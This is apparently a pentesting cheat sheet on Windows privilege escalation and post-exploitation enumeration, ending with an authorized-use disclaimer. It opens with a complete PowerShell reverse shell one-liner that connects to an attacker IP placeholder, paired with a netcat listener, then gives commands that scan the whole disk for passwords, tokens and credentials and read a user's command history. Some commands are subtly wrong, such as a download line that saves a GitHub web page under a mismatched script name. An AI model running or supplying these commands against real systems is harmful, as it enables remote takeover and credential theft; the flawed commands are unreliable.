# Privilege Escalation & Post-Exploitation Enumeration For Windows

This document provides a comprehensive guide to privilege escalation and post-exploitation enumeration on Windows operating systems. It includes basic and advanced techniques to help identify and exploit potential vectors for escalating privileges. Some of these might be Exploitable with [Lolbins](https://lolbas-project.github.io/).

### Table of Contents
1. [PowerShell Reverse Shell & Netcat Listener](#powershell-reverse-shell--netcat-listener)
2. [Upgrading to a TTY Shell](#upgrading-to-a-tty-shell)
3. [Basic Post-Exploitation Enumeration Commands](#basic-post-exploitation-enumeration-commands)
4. [Advanced Privilege Escalation Techniques](#advanced-privilege-escalation-techniques)
5. [Using Automated Tools for Enumeration](#using-automated-tools-for-enumeration)

## PowerShell Reverse Shell & Netcat Listener

A reverse shell connects a compromised machine to an attacker's IP for remote command execution. A Netcat listener waits on a specified port to receive incoming connections.

### PowerShell Reverse Shell
```powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.x.y", 4444); $stream = $client.GetStream(); [byte[]]$buffer = 0..65535 | % {0}; while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length) }
```

### Netcat Listener
```bash
nc -nvlp 4444
```

## Upgrading to a TTY Shell

A TTY shell enhances the interactivity and functionality of a command-line interface. Follow these steps to achieve a fully functional TTY shell:

### Step 1: Spawn a Better TTY Shell
```powershell
$wshell = New-Object -ComObject wscript.shell
$wshell.run("cmd.exe /k", 7)
```

### Step 2: Set or Modify PATH Environment Variable
```powershell
[System.Environment]::SetEnvironmentVariable('PATH', "$env:PATH;C:\new\path", [System.EnvironmentVariableTarget]::User)
```

### Step 3: Access Terminal Commands
To change terminal settings, use the `mode` command:
```cmd
mode con: cols=200 lines=50
```

## Basic Post-Exploitation Enumeration Commands

These commands help identify sensitive information and potential privilege escalation vectors:

#### 1. Finding Secret Files
```powershell
Get-ChildItem -Path C:\ -Recurse -File | Select-String -Pattern 'secret|token|key|api|password|username|db_password|mysql_password|mysql_user|databasepassword|mysql_root_password|mysql_password|credentials|creds|pass'
```

#### 2. Checking File Permissions
```powershell
Get-ChildItem -Path C:\Users\%username%\ -Recurse | Get-Acl | Where-Object { $_.Access.IdentityReference -match "SYSTEM|Administrators" }
```

#### 3. Checking Permissions on System Files
```powershell
Get-Acl C:\Windows\System32\* | Format-List
```

#### 4. Listing Scheduled Tasks
```powershell
Get-ScheduledTask | Format-List
```

#### 5. Searching for Passwords in Home Directory
```powershell
Get-ChildItem -Path C:\Users\%username%\ -Recurse | Select-String -Pattern 'password'
```

#### 6. Checking User Permissions
```powershell
whoami /all
```

#### 7. Checking System Information
```powershell
systeminfo
```

#### 8. Reviewing Log Files
```powershell
Get-EventLog -LogName Security -Newest 100 | Format-List
```

#### 9. Listing Environment Variables
```powershell
Get-ChildItem Env:
```

#### 10. Accessing User's Command History
```powershell
Get-Content (Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')
```

#### 11. Finding Writable Binaries
```powershell
Get-ChildItem -Path C:\ -Recurse -File | Where-Object { $_.Attributes -match "Archive" }
```

#### 12. Finding Writable Files
```powershell
Get-ChildItem -Path C:\ -Recurse -File | Where-Object { $_.Attributes -match "ReadOnly" -eq $false }
```

#### 13. Finding Writable Directories
```powershell
Get-ChildItem -Path C:\ -Recurse -Directory | Where-Object { $_.Attributes -match "ReadOnly" -eq $false }
```

#### 14. Finding Executables in PATH
```powershell
$env:PATH -split ";" | ForEach-Object { Get-ChildItem -Path $_ -Recurse -File -Filter *.exe }
```

## Advanced Privilege Escalation Techniques

These techniques delve deeper into identifying and exploiting privilege escalation opportunities:

1. **Network Configuration:** `netstat -ano`
2. **Checking Installed Software:** `wmic product get name,version`
3. **Checking Kernel Version:** `systeminfo | findstr /B /C:"OS Version"`
4. **File Integrity and Monitoring:** `Get-ChildItem -Path C:\ -Recurse | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) }`

## Using Automated Tools for Enumeration
```powershell
Invoke-WebRequest -Uri "https://github.com/411Hall/JAWS/blob/master/jaws-enum.ps1" -OutFile "PowerUp.ps1"
```

## Specific Environment Checks

- **For Windows Containers:** `docker inspect <container_id>`
- **For Windows Subsystem for Linux (WSL):** `wsl.exe -l -v`

This guide is intended for educational and authorized security testing purposes only. Please always make sure you have explicit permission before conducting any security assessments.
